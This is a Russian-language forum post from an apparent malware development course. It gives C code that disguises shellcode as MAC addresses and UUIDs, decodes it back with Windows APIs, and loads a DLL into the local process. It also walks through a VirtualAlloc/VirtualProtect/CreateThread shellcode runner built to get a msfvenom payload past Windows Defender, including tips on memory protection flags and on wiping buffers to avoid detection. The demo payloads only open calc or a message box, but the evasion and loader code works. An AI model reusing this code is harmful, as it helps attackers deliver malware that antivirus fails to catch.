Следующий рисунок показывает, что указанный код успешно запущен...<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773922958.png"
		data-src="https://osint42.org/attachments/1746773922958-png.82/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773922958-png.82/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773922958.png"
			title="1746773922958.png"
			width="1408" height="836" loading="lazy" />
	</div><br />
<br />
<b>2)Реализация MACFuscation </b><br />
<br />
Реализация MACFuscation будет аналогична тому, что было сделано в предыдущем модуле с IPv4/IPv6fuscation. MAC-адрес состоит из 6 байтов, поэтому shellcode должен быть кратным 6, который, как и ранее, может быть дополнен, если он не соответствует этому требованию.<br />
<br />
Принцип работы очень прост: каждые 6 байтов shellcode преобразуются в один MAC-адрес. Этот подход позволяет создать дополнительный уровень обфускации, так как MAC-адреса являются стандартными и не вызовут подозрений при статическом анализе.<br />
<br />
Важно помнить, что, как и с другими методами обфускации, MACFuscation не добавляет дополнительного уровня безопасности или шифрования к shellcode, а просто меняет его внешний вид. Это делается для того, чтобы затруднить обнаружение и анализ shellcode.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Function takes in 6 raw bytes and returns them in a MAC address string format
char* GenerateMAC(int a, int b, int c, int d, int e, int f) {
    char Output[64];

    // Creating the MAC address and saving it to the &#039;Output&#039; variable
    sprintf(Output, &quot;%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X&quot;,a, b, c, d, e, f);

    // Optional: Print the &#039;Output&#039; variable to the console
    // printf(&quot;[i] Output: %s\n&quot;, Output);

    return (char*)Output;
}

// Generate the MAC output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer &amp; the size of the shellcode buffer
BOOL GenerateMacOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

    // If the shellcode buffer is null or the size is not a multiple of 6, exit
    if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 6 != 0){
        return FALSE;
    }
    printf(&quot;char* MacArray [%d] = {\n\t&quot;, (int)(ShellcodeSize / 6));

    // We will read one shellcode byte at a time, when the total is 6, begin generating the MAC address
    // The variable &#039;c&#039; is used to store the number of bytes read. By default, starts at 6.
    int c = 6, counter = 0;
    char* Mac = NULL;

    for (int i = 0; i &lt; ShellcodeSize; i++) {

        // Track the number of bytes read and when they reach 6 we enter this if statement to begin generating the MAC address
        if (c == 6) {
            counter++;

            // Generating the MAC address from 6 bytes which begin at i until [i + 5]
            Mac = GenerateMAC(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5]);

            if (i == ShellcodeSize - 6) {

                // Printing the last MAC address
                printf(&quot;\&quot;%s\&quot;&quot;, Mac);
                break;
            }
            else {
                // Printing the MAC address
                printf(&quot;\&quot;%s\&quot;, &quot;, Mac);
            }
            c = 1;

            // Optional: To beautify the output on the console
            if (counter % 6 == 0) {
                printf(&quot;\n\t&quot;);
            }
        }
        else {
            c++;
        }
    }
    printf(&quot;\n};\n\n&quot;);
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Деобфускация Payloads MACFuscation</b><br />
<br />
Процесс деобфускации будет обратным процессу обфускации, позволяя генерировать байты из MAC-адреса вместо использования байтов для создания MAC-адреса. Для выполнения деобфускации потребуется использование функции NTDLL API - RtlEthernetStringToAddressA. Эта функция преобразует MAC-адрес из строкового представления в его бинарный формат.<br />
<br />
Для деобфускации payload, который был обфусцирован с использованием MACFuscation, вы должны будете выполнить следующие шаги:<br />
<ol>
<li data-xf-list-type="ol">Инициализация: Получите адрес функции RtlEthernetStringToAddressA с использованием GetProcAddress и GetModuleHandle.</li>
<li data-xf-list-type="ol">Выделите буфер для деобфусцированного payload. Поскольку каждый MAC-адрес генерирует 6 байтов, размер буфера будет кратен 6.</li>
<li data-xf-list-type="ol">Итерация: Пройдите через каждый MAC-адрес в обфусцированном payload.</li>
<li data-xf-list-type="ol">Конвертация: Используйте RtlEthernetStringToAddressA для преобразования каждого MAC-адреса из строкового представления в бинарный формат.</li>
<li data-xf-list-type="ol">Сохранение: Добавьте преобразованные байты в буфер деобфусцированного payload.</li>
</ol>После завершения этого процесса у вас будет деобфусцированный payload, который можно будет исполнить.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef NTSTATUS (NTAPI* fnRtlEthernetStringToAddressA)(
    PCSTR        S,
    PCSTR*         Terminator,
    PVOID        Addr
);

BOOL MacDeobfuscation(IN CHAR* MacArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE          pBuffer        = NULL,
                   TmpBuffer      = NULL;

    SIZE_T         sBuffSize      = NULL;

    PCSTR          Terminator     = NULL;

    NTSTATUS       STATUS         = NULL;

    // Getting RtlIpv6StringToAddressA address from ntdll.dll
    fnRtlEthernetStringToAddressA pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(TEXT(&quot;NTDLL&quot;)), &quot;RtlEthernetStringToAddressA&quot;);
    if (pRtlEthernetStringToAddressA == NULL) {
        printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of MAC addresses * 6
    sBuffSize = NmbrOfElements * 6;


    // Allocating memeory which will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    TmpBuffer = pBuffer;

    // Loop through all the MAC addresses saved in MacArray
    for (int i = 0; i &lt; NmbrOfElements; i++) {

        // Deobfuscating one MAC address at a time
        // MacArray[i] is a single Mac address from the array MacArray
        if ((STATUS = pRtlEthernetStringToAddressA(MacArray[i], &amp;Terminator, TmpBuffer)) != 0x0) {
            // if it failed
            printf(&quot;[!] RtlEthernetStringToAddressA Failed At [%s] With Error 0x%0.8X&quot;, MacArray[i], STATUS);
            return FALSE;
        }

        // 6 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 6 to store the
        TmpBuffer = (PBYTE)(TmpBuffer + 6);

    }

    // Save the base address &amp; size of the deobfuscated payload
    *ppDAddress  = pBuffer;
    *pDSize      = sBuffSize;

    return TRUE;

}</code></pre>
	</div>
</div><br />
Пример запуска кода.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773939975.png"
		data-src="https://osint42.org/attachments/1746773939975-png.83/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773939975-png.83/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773939975.png"
			title="1746773939975.png"
			width="1376" height="859" loading="lazy" />
	</div><br />
<br />
<b>3)UUID-Обфускация</b><br />
Рассмотрим еще одну технику обфускации, которая преобразует shellcode в строку Универсального Уникального Идентификатора (UUID).<br />
UUID представляет собой 36-символьную буквенно-цифровую строку, которую можно использовать для идентификации информации.<br />
<br />
<b>Структура UUID</b><br />
<br />
Формат UUID состоит из 5 сегментов разного размера, которые выглядят примерно так: 801B18F0-8320-4ADA-BB13-41EA1C886B87. Изображение ниже иллюстрирует структуру UUID.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773949798.png"
		data-src="https://osint42.org/attachments/1746773949798-png.84/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773949798-png.84/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773949798.png"
			title="1746773949798.png"
			width="791" height="419" loading="lazy" />
	</div><br />
<br />
Преобразование UUID в shellcode является несколько менее очевидным, чем предыдущие методы обфускации. Например, FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51 не преобразуется в FC4883E4-F0E8-C000-0000-415141505251, вместо этого получается E48348FC-E8F0-00C0-0000-415141505251.<br />
<br />
Обратите внимание, что первые 3 сегмента используют те же байты в нашем shellcode, но порядок обратный. Причина в том, что первые три сегмента используют порядок байтов little-endian. Для полного понимания давайте разберемся с каждым сегментом.<br />
<br />
Little Endian: Сегмент 1: FC 48 83 E4 становится E4 83 48 FC в строке UUID Сегмент 2: E8 F0 становится F0 E8 в строке UUID Сегмент 3: C0 00 становится 00 C0 в строке UUID<br />
<br />
Big Endian: Сегмент 4: 00 00 остается 00 00 в строке UUID Сегмент 5: 41 51 41 50 52 51 остается 41 51 41 50 52 51 в строке UUID<br />
<br />
Реализация UUIDFuscation: Адрес UUID состоит из 16 байтов, поэтому shellcode должен быть кратен 16. UUIDFuscation будет во многом напоминать IPv6Fuscation из-за того, что оба метода требуют кратности shellcode 16 байтам. Опять же, можно дополнить буфер, если shellcode не соответствует этому требованию.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Function takes in 16 raw bytes and returns them in a UUID string format
char* GenerateUUid(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {

    // Each UUID segment is 32 bytes
    char Output0[32], Output1[32], Output2[32], Output3[32];

    // There are 4 segments in a UUID (32 * 4 = 128)
    char result[128];

    // Generating output0 from the first 4 bytes
    sprintf(Output0, &quot;%0.2X%0.2X%0.2X%0.2X&quot;, d, c, b, a);

    // Generating output1 from the second 4 bytes
    sprintf(Output1, &quot;%0.2X%0.2X-%0.2X%0.2X&quot;, f, e, h, g);

    // Generating output2 from the third 4 bytes
    sprintf(Output2, &quot;%0.2X%0.2X-%0.2X%0.2X&quot;, i, j, k, l);

    // Generating output3 from the last 4 bytes
    sprintf(Output3, &quot;%0.2X%0.2X%0.2X%0.2X&quot;, m, n, o, p);

    // Combining Output0,1,2,3 to generate the UUID
    sprintf(result, &quot;%s-%s-%s%s&quot;, Output0, Output1, Output2, Output3);

    //printf(&quot;[i] result: %s\n&quot;, (char*)result);
    return (char*)result;
}

// Generate the UUID output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer &amp; the size of the shellcode buffer
BOOL GenerateUuidOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
    // If the shellcode buffer is null or the size is not a multiple of 16, exit
    if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 16 != 0) {
        return FALSE;
    }
    printf(&quot;char* UuidArray[%d] = { \n\t&quot;, (int)(ShellcodeSize / 16));

    // We will read one shellcode byte at a time, when the total is 16, begin generating the UUID string
    // The variable &#039;c&#039; is used to store the number of bytes read. By default, starts at 16.
    int c = 16, counter = 0;
    char* UUID = NULL;

    for (int i = 0; i &lt; ShellcodeSize; i++) {
        // Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the UUID string
        if (c == 16) {
            counter++;

            // Generating the UUID string from 16 bytes which begin at i until [i + 15]
            UUID = GenerateUUid(
                pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3],
                pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7],
                pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11],
                pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]
            );
            if (i == ShellcodeSize - 16) {

                // Printing the last UUID string
                printf(&quot;\&quot;%s\&quot;&quot;, UUID);
                break;
            }
            else {
                // Printing the UUID string
                printf(&quot;\&quot;%s\&quot;, &quot;, UUID);
            }
            c = 1;
            // Optional: To beautify the output on the console
            if (counter % 3 == 0) {
                printf(&quot;\n\t&quot;);
            }
        }
        else {
            c++;
        }
    }
    printf(&quot;\n};\n\n&quot;);
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Реализация деобфускации UUID</b><br />
<br />
Хотя разные сегменты имеют разный порядок байтов (endianness), это не повлияет на процесс деобфускации, потому что функция WinAPI UuidFromStringA учитывает это.<br />
<br />
То есть при использовании функции UuidFromStringA для преобразования строкового представления UUID обратно в бинарный формат, порядок байтов автоматически учитывается внутри функции, и вы получаете правильное бинарное представление без необходимости явно преобразовывать порядок байтов для различных сегментов UUID.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef RPC_STATUS (WINAPI* fnUuidFromStringA)(
    RPC_CSTR    StringUuid,
    UUID*        Uuid
);

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

        PBYTE          pBuffer         = NULL,
                       TmpBuffer       = NULL;

        SIZE_T         sBuffSize       = NULL;

        RPC_STATUS     STATUS          = NULL;

    // Getting UuidFromStringA address from Rpcrt4.dll
    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT(&quot;RPCRT4&quot;)), &quot;UuidFromStringA&quot;);
    if (pUuidFromStringA == NULL) {
        printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of UUID strings * 16
    sBuffSize = NmbrOfElements * 16;

    // Allocating memory which will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
    if (pBuffer == NULL) {
        printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;

    // Loop through all the UUID strings saved in UuidArray
    for (int i = 0; i &lt; NmbrOfElements; i++) {

        // Deobfuscating one UUID string at a time
        // UuidArray[i] is a single UUID string from the array UuidArray
        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
            // if it failed
            printf(&quot;[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X&quot;, UuidArray[i], STATUS);
            return FALSE;
        }

        // 16 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 16);

    }

    *ppDAddress = pBuffer;
    *pDSize     = sBuffSize;

    return TRUE;
}</code></pre>
	</div>
</div><br />
Демонстрация запуска кода:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773964608.png"
		data-src="https://osint42.org/attachments/1746773964608-png.85/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773964608-png.85/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773964608.png"
			title="1746773964608.png"
			width="1296" height="802" loading="lazy" />
	</div></div>
						

							<h2>Локальный запуск Payload</h2>

							

							

							<div class="bbWrapper">Предлагаю в этой статье исследовать использование динамических библиотек (DLL) в качестве полезной нагрузки и попробовать загрузить вредоносный файл DLL в текущем процессе.<br />
<br />
<b>Создание DLL</b><br />
<br />
Создание DLL просто и может быть выполнено с помощью Visual Studio.<br />
Создайте новый проект, выберите язык программирования C++, а затем выберите Динамически-связанную библиотеку (DLL).<br />
Это создаст код-скелет DLL, который будет изменяться в этой статье.<br />
<br />
Если вы хотите освежить свои знания о том, как работают DLL, то можете обратится к этой статье:<a href="https://ru-sfera.pw/threads/razrabotka-malvari-5-izuchaem-dinamicheskie-biblioteki.4420/" target="_blank" class="link link--external" rel="noopener">Уроки - Разработка малвари - 5. Изучаем динамические библиотеки</a><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779064418.png"
		data-src="https://osint42.org/attachments/1746779064418-png.86/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779064418-png.86/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779064418.png"
			title="1746779064418.png"
			width="1071" height="699" loading="lazy" />
	</div><br />
<br />
В этой статье будет использовано диалоговое окно, которое появляется, когда DLL успешно загружена.<br />
<br />
Создание диалогового окна можно легко сделать с помощью MessageBox из WinAPI.<br />
<br />
Приведенный ниже фрагмент кода будет запускать MsgBoxPayload каждый раз, когда DLL загружается в процесс.<br />
<br />
Обратите внимание, что предварительно скомпилированные заголовки были удалены из настроек C/C++ проекта, как показано здесь Уроки - Разработка малвари - 5. Изучаем динамические библиотеки<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

VOID MsgBoxPayload() {
    MessageBoxA(NULL, &quot;Hacking With ru-sfera.pw&quot;, &quot;Wow !&quot;, MB_OK | MB_ICONINFORMATION);
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD dwReason, LPVOID lpReserved){

    switch (dwReason){
        case DLL_PROCESS_ATTACH: {
            MsgBoxPayload();
            break;
        };
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
Напомним, что WinAPI LoadLibrary используется для загрузки DLL. Функция принимает путь к DLL на диске и загружает его в адресное пространство вызывающего процесса, который в нашем случае будет текущим процессом. Загрузка DLL запустит ее точку входа, а значит, выполнится функция MsgBoxPayload, и появится диалоговое окно. Хотя концепция проста, это станет полезным в последующих статьях для понимания более сложных техник.<br />
<br />
Ниже приведенный код примет имя DLL в качестве аргумента командной строки, загрузит его с помощью LoadLibraryA и выполнит проверку ошибок, чтобы убедиться, что DLL загрузилась успешно.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char* argv[]) {

    if (argc &lt; 2){
        printf(&quot;[!] Отсутствует аргумент; Нужно указать DLL для выполнения \n&quot;);
        return -1;
    }

    printf(&quot;[i] Внедрение \&quot;%s\&quot; в локальный процесс с PID: %d \n&quot;, argv[1], GetCurrentProcessId());

    printf(&quot;[+] Загрузка DLL... &quot;);
    if (LoadLibraryA(argv[1]) == NULL) {
        printf(&quot;[!] LoadLibraryA завершилась с ошибкой: %d \n&quot;, GetLastError());
        return -1;
    }
    printf(&quot;[+] ГОТОВО ! \n&quot;);

    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы выйти ... &quot;);
    getchar();

    return 0;
}</code></pre>
	</div>
</div><br />
<b>Вывод</b><br />
<br />
Как и ожидалось, после внедрения DLL успешно появляется диалоговое окно.<br />
<br />
<b>Анализ процесса</b><br />
<br />
Для дополнительной проверки того, что DLL загружена в процесс, запустите Process Hacker, дважды щелкните по процессу, который загрузил DLL, и перейдите на вкладку &quot;Модули&quot;. Имя DLL должно появиться в списке модулей. Нажав на имя DLL, можно получить дополнительную информацию о ней, такую как импорт, подпись и названия разделов.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779123361.png"
		data-src="https://osint42.org/attachments/1746779123361-png.87/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779123361-png.87/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779123361.png"
			title="1746779123361.png"
			width="876" height="651" loading="lazy" />
	</div><br />
<br />
Теперь предлагаю рассмотреть однин из самых простых способов выполнения shellcode путем создания нового потока.<br />
Несмотря на простоту этой техники, важно понимать, как она работает, так как это лежит в основе более сложных методов выполнения shellcode.<br />
<br />
Метод, обсуждаемый в этой статье, использует Windows API: VirtualAlloc, VirtualProtect и CreateThread. Важно отметить, что этот метод никоим образом не является скрытной техникой, <b><u>и EDR (Endpoint Detection and Response) почти наверняка обнаружит эту простую технику выполнения shellcode.</u></b><br />
<br />
С другой стороны, антивирусы потенциально могут быть обойдены с использованием этого метода <b><u>при достаточной обфускации.</u><br />
<br />
Необходимые Windows API</b><br />
<br />
Хорошей отправной точкой будет изучение документации по Windows API, которые будут использоваться:<br />
<br />
<ul>
<li data-xf-list-type="ul"><b>VirtualAlloc</b> - выделяет память, которая будет использоваться для хранения полезной нагрузки.</li>
<li data-xf-list-type="ul"><b>VirtualProtect</b> - меняет защиту памяти выделенной области на исполняемую, чтобы выполнить полезную нагрузку.</li>
<li data-xf-list-type="ul"><b>CreateThread</b> - создает новый поток, который выполняет полезные нагрузки.</li>
</ul><b>Обфускация полезной нагрузки</b><br />
<br />
Полезная нагрузка, используемая в этой статье, будет сгенерированной с помощью Msfvenom x64 calc payload.<br />
<br />
Чтобы демонстрация была реалистичной, будет предпринята попытка <b><u>обхода Defender, и поэтому обфускация или шифрование полезной нагрузки будут необходимы. </u></b><br />
<br />
Для обфускации полезной нагрузки будет использоваться программа <a href="https://github.com/NUL0x4C/HellShell" target="_blank" class="link link--external" rel="noopener">HellShell</a>.<br />
<br />
Запустите следующую команду:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>HellShell.exe msfvenom.bin uuid</code></pre>
	</div>
</div><br />
Вывод следует сохранить в переменную UuidArray.<br />
<br />
<b>Выделение памяти</b><br />
<br />
VirtualAlloc используется для выделения памяти размером sDeobfuscatedSize. Размер sDeobfuscatedSize определяется функцией UuidDeobfuscation, которая возвращает общий размер деобфусцированной полезной нагрузки.<br />
<br />
Функция Windows API VirtualAlloc выглядит следующим образом согласно ее документации:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);</code></pre>
	</div>
</div><br />
Тип выделения памяти указан как MEM_RESERVE | MEM_COMMIT, что будет резервировать диапазон страниц в виртуальном адресном пространстве вызывающего процесса и выделять физическую память для этих зарезервированных страниц. Комбинированные флаги обсуждаются отдельно:<br />
<ul>
<li data-xf-list-type="ul">MEM_RESERVE используется для резервирования диапазона страниц без выделения физической памяти.</li>
<li data-xf-list-type="ul">MEM_COMMIT используется для выделения диапазона страниц в виртуальном адресном пространстве процесса.</li>
</ul>Последний параметр VirtualAlloc устанавливает разрешения на регионе памяти. Самым простым способом будет установить защиту памяти на PAGE_EXECUTE_READWRITE, но это обычно является признаком злонамеренной активности для многих средств обеспечения безопасности. Поэтому защита памяти устанавливается на PAGE_READWRITE, так как на этом этапе требуется только запись полезной нагрузки, но не ее выполнение. Наконец, VirtualAlloc вернет базовый адрес выделенной памяти.<br />
<br />
<b>Запись полезной нагрузки в память</b><br />
<br />
Затем байты деобфусцированной полезной нагрузки копируются в новый выделенный регион памяти по адресу pShellcodeAddress, а затем pDeobfuscatedPayload очищается, перезаписывая его нулями. pDeobfuscatedPayload - это базовый адрес, выделенный кучей функцией UuidDeobfuscation, которая возвращает байты сырой полезной нагрузки shellcode. Он был перезаписан нулями, так как больше не требуется, и, таким образом, это снизит вероятность обнаружения полезной нагрузки в памяти системами безопасности.<br />
<br />
<b>Изменение защиты памяти</b><br />
<br />
Перед выполнением полезной нагрузки необходимо изменить защиту памяти, так как в данный момент разрешена только операция чтения/записи. VirtualProtect используется для изменения защиты памяти, и для выполнения полезной нагрузки ей понадобится либо PAGE_EXECUTE_READ, либо PAGE_EXECUTE_READWRITE.<br />
<br />
Функция VirtualProtect WinAPI выглядит следующим образом на основе ее документации:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL VirtualProtect(
  [in]  LPVOID lpAddress,       // Базовый адрес региона памяти, доступ к которому должен быть изменен
  [in]  SIZE_T dwSize,          // Размер региона, атрибуты доступа к которому должны быть изменены, в байтах
  [in]  DWORD  flNewProtect,    // Новый параметр защиты памяти
  [out] PDWORD lpflOldProtect   // Указатель на переменную &#039;DWORD&#039;, которая получает предыдущее значение доступа к защите &#039;lpAddress&#039;
);</code></pre>
	</div>
</div><br />
Хотя некоторые shellcode требуют PAGE_EXECUTE_READWRITE, такие как саморасшифровывающийся shellcode, для Msfvenom x64 calc shellcode это не требуется, но приведенный ниже фрагмент кода использует эту защиту памяти.<br />
<br />
<b>Выполнение полезной нагрузки через CreateThread</b><br />
<br />
Наконец, полезная нагрузка выполняется путем создания нового потока с помощью функции CreateThread Windows API и передачи pShellcodeAddress, который является адресом shellcode.<br />
<br />
Функция CreateThread WinAPI выглядит следующим образом на основе ее документации:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,    // Установлено в NULL - необязательно
  [in]            SIZE_T                  dwStackSize,           // Установлено в 0 - по умолчанию
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,        // Указатель на функцию, которая будет выполнена потоком, в нашем случае это базовый адрес полезной нагрузки
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,           // Указатель на переменную, которая будет передана функции, выполняемой (установлено в NULL - необязательно)
  [in]            DWORD                   dwCreationFlags,       // Установлено в 0 - по умолчанию
  [out, optional] LPDWORD                 lpThreadId             // указатель на переменную &#039;DWORD&#039;, которая получает ID потока (установлено в NULL - необязательно)
);</code></pre>
	</div>
</div><br />
<b>Выполнение полезной нагрузки через указатель на функцию</b><br />
<br />
В качестве альтернативы существует более простой способ выполнения shellcode без использования Windows API CreateThread. В приведенном ниже примере shellcode приводится к указателю функции VOID и shellcode выполняется как указатель на функцию. Код по сути переходит к адресу pShellcodeAddress.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>(*(VOID(*)()) pShellcodeAddress)();</code></pre>
	</div>
</div><br />
Это эквивалентно выполнению кода ниже:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef VOID (WINAPI* fnShellcodefunc)();       // Определено перед основной функцией
    fnShellcodefunc pShell = (fnShellcodefunc) pShellcodeAddress;
    pShell();</code></pre>
	</div>
</div><br />
<b>CreateThread против выполнения через указатель на функцию</b><br />
<br />
Хотя можно выполнить shellcode, используя метод указателя на функцию, это, как правило, не рекомендуется. Сгенерированный shellcode Msfvenom завершает вызывающий поток после завершения его выполнения. Если shellcode был выполнен с использованием метода указателя на функцию, то вызывающий поток будет основным потоком, и поэтому весь процесс завершится после завершения выполнения shellcode.<br />
<br />
Выполнение shellcode в новом потоке предотвращает эту проблему, потому что если выполнение shellcode завершено, новый рабочий поток будет завершен, а не основной поток, предотвращая завершение всего процесса.<br />
<br />
<b>Ожидание выполнения потока</b><br />
<br />
